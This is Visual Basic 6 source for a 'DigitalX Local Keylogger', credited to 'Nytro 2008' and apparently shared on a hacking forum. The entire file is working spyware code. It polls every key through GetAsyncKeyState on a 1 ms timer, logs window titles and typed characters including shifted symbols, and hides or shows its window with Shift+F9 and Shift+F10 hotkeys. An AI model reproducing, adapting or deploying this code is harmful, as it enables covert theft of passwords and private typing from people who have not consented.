VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "DigitalX Local Keylogger"
   ClientHeight    =   7950
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   9090
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Form1.frx":6852
   ScaleHeight     =   7950
   ScaleWidth      =   9090
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer2 
      Interval        =   1
      Left            =   7800
      Top             =   120
   End
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   1725
      Left            =   960
      Picture         =   "Form1.frx":21EA2
      ScaleHeight     =   1725
      ScaleWidth      =   1890
      TabIndex        =   1
      Top             =   4920
      Width           =   1890
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   6975
      Left            =   3840
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Text            =   "Form1.frx":23221
      Top             =   720
      Width           =   4935
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   8280
      Top             =   120
   End
   Begin VB.Line Line4 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   3840
      Y1              =   4680
      Y2              =   4680
   End
   Begin VB.Line Line2 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   3840
      Y1              =   3120
      Y2              =   3120
   End
   Begin VB.Line Line1 
      BorderColor     =   &H00FFFFFF&
      X1              =   0
      X2              =   3840
      Y1              =   1920
      Y2              =   1920
   End
   Begin VB.Label Label12 
      BackStyle       =   0  'Transparent
      Caption         =   "Show : Shift + F10"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   360
      TabIndex        =   13
      Top             =   4200
      Width           =   2775
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "Hide : Shift + F9"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   360
      TabIndex        =   12
      Top             =   3720
      Width           =   2415
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Shortcuts"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   1320
      TabIndex        =   11
      Top             =   3240
      Width           =   1455
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "[ No ] "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   2280
      TabIndex        =   10
      Top             =   2520
      Width           =   855
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "[ Yes ]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   480
      TabIndex        =   9
      Top             =   2520
      Width           =   975
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "[ Stop ]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   2040
      TabIndex        =   8
      Top             =   1320
      Width           =   1215
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "[ Start ]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   480
      TabIndex        =   7
      Top             =   1320
      Width           =   1215
   End
   Begin VB.Shape Shape1 
      Height          =   495
      Left            =   3960
      Top             =   3720
      Width           =   1215
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "[ www.rstzone.org ]"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   840
      TabIndex        =   6
      Top             =   7320
      Width           =   2295
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "(c) Nytro 2008"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1080
      TabIndex        =   5
      Top             =   6960
      Width           =   1695
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Enable Backspace"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   600
      TabIndex        =   4
      Top             =   2040
      Width           =   2655
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Keylogging"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   1080
      TabIndex        =   3
      Top             =   840
      Width           =   1815
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "DigitalX Local Keylogger v1.0"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   495
      Left            =   2520
      TabIndex        =   2
      Top             =   120
      Width           =   4215
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal sWndTitle As String, ByVal cLen As Long) As Long
Private hForegroundWnd As Long
Private backs As Boolean
Public pass As String

Private Sub Form_Load()
backs = True
pass = ""
End Sub

Private Sub Form_Resize()
Me.Width = 9210
Me.Height = 8460
End Sub

Private Sub Label6_Click()
Timer1.Enabled = True
End Sub

Private Sub Label7_Click()
Timer1.Enabled = False
End Sub

Private Sub Label8_Click()
backs = True
End Sub

Private Sub Label9_Click()
backs = False
End Sub

Private Sub Text1_Change()
Text1.SelStart = 0
Text1.SelLength = Len(Text1.Text)
End Sub

Private Sub Text1_GotFocus()
Picture1.SetFocus
End Sub

Private Sub Timer1_Timer()

Dim x, x2, i, t As Integer
Dim win As Long
Dim Title As String * 1000

win = GetForegroundWindow()
If (win = hForegroundWnd) Then
GoTo Keylogger
Else
hForegroundWnd = GetForegroundWindow()
Title = ""

    GetWindowText hForegroundWnd, Title, 1000
    

Select Case Asc(Title)
  
Case 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95
     Text1.Text = Text1.Text & vbCrLf & vbCrLf & "[ " & Title
     Text1.Text = Text1.Text & " ]" & vbCrLf
End Select

End If

Exit Sub

Keylogger:

For i = 65 To 90

 x = GetAsyncKeyState(i)
 x2 = GetAsyncKeyState(16)


 If x = -32767 Then

  If x2 = -32768 Then
   Text1.Text = Text1.Text & Chr(i)
  Else: Text1.Text = Text1.Text & Chr(i + 32)
  End If
  
 End If

Next

For i = 8 To 222

If i = 65 Then i = 91

x = GetAsyncKeyState(i)
x2 = GetAsyncKeyState(16)


If x = -32767 Then

Select Case i

   Case 48
      Text1.Text = Text1.Text & IIf(x2 = -32768, ")", "0")
   Case 49
      Text1.Text = Text1.Text & IIf(x2 = -32768, "!", "1")
   Case 50
      Text1.Text = Text1.Text & IIf(x2 = -32768, "@", "2")
   Case 51
      Text1.Text = Text1.Text & IIf(x2 = -32768, "#", "3")
   Case 52
      Text1.Text = Text1.Text & IIf(x2 = -32768, "$", "4")
   Case 53
      Text1.Text = Text1.Text & IIf(x2 = -32768, "%", "5")
   Case 54
      Text1.Text = Text1.Text & IIf(x2 = -32768, "^", "6")
   Case 55
      Text1.Text = Text1.Text & IIf(x2 = -32768, "&", "7")
   Case 56
      Text1.Text = Text1.Text & IIf(x2 = -32768, "*", "8")
   Case 57
      Text1.Text = Text1.Text & IIf(x2 = -32768, "(", "9")

Case 112: Text1.Text = Text1.Text & " F1 "
Case 113: Text1.Text = Text1.Text & " F2 "
Case 114: Text1.Text = Text1.Text & " F3 "
Case 115: Text1.Text = Text1.Text & " F4 "
Case 116: Text1.Text = Text1.Text & " F5 "
Case 117: Text1.Text = Text1.Text & " F6 "
Case 118: Text1.Text = Text1.Text & " F7 "
Case 119: Text1.Text = Text1.Text & " F8 "
Case 120: Text1.Text = Text1.Text & " F9 "
Case 121: Text1.Text = Text1.Text & " F10 "
Case 122: Text1.Text = Text1.Text & " F11 "
Case 123: Text1.Text = Text1.Text & " F12 "

Case 220: Text1.Text = Text1.Text & IIf(x2 = -32768, "|", "\")
Case 188: Text1.Text = Text1.Text & IIf(x2 = -32768, "<", ",")
Case 189: Text1.Text = Text1.Text & IIf(x2 = -32768, "_", "-")
Case 190: Text1.Text = Text1.Text & IIf(x2 = -32768, ">", ".")
Case 191: Text1.Text = Text1.Text & IIf(x2 = -32768, "?", "/")
Case 187: Text1.Text = Text1.Text & IIf(x2 = -32768, "+", "=")
Case 186: Text1.Text = Text1.Text & IIf(x2 = -32768, ":", ";")
Case 222: Text1.Text = Text1.Text & IIf(x2 = -32768, Chr(34), "'")
Case 219: Text1.Text = Text1.Text & IIf(x2 = -32768, "{", "[")
Case 221: Text1.Text = Text1.Text & IIf(x2 = -32768, "}", "]")
Case 192: Text1.Text = Text1.Text & IIf(x2 = -32768, "~", "`")


Case 8: If backs = True Then If Len(Text1.Text) > 0 Then Text1.Text = Mid(Text1.Text, 1, Len(Text1.Text) - 1)
Case 9: Text1.Text = Text1.Text & " [ Tab ] "
Case 13: Text1.Text = Text1.Text & vbCrLf
Case 17: Text1.Text = Text1.Text & " [ Ctrl ]"
Case 18: Text1.Text = Text1.Text & " [ Alt ] "
Case 19: Text1.Text = Text1.Text & " [ Pause ] "
Case 20: Text1.Text = Text1.Text & " [ Capslock ] "
Case 27: Text1.Text = Text1.Text & " [ Esc ] "
Case 32: Text1.Text = Text1.Text & " "
Case 33: Text1.Text = Text1.Text & " [ PageUp ] "
Case 34: Text1.Text = Text1.Text & " [ PageDown ] "
Case 35: Text1.Text = Text1.Text & " [ End ] "
Case 36: Text1.Text = Text1.Text & " [ Home ] "
Case 37: Text1.Text = Text1.Text & " [ Left ] "
Case 38: Text1.Text = Text1.Text & " [ Up ] "
Case 39: Text1.Text = Text1.Text & " [ Right ] "
Case 40: Text1.Text = Text1.Text & " [ Down ] "
Case 41: Text1.Text = Text1.Text & " [ Select ] "
Case 44: Text1.Text = Text1.Text & " [ PrintScreen ] "
Case 45: Text1.Text = Text1.Text & " [ Insert ] "
Case 46: Text1.Text = Text1.Text & " [ Del ] "
Case 47: Text1.Text = Text1.Text & " [ Help ] "
Case 91, 92: Text1.Text = Text1.Text & " [ Windows ] "
  
End Select
  
  
End If

Next

End Sub


Private Sub Timer2_Timer()
Dim a, b, x As Long
a = GetAsyncKeyState(120)
b = GetAsyncKeyState(121)
x = GetAsyncKeyState(16)
If a = -32767 And x = -32768 Then Me.Hide
If b = -32767 And x = -32768 Then Me.Show
End Sub
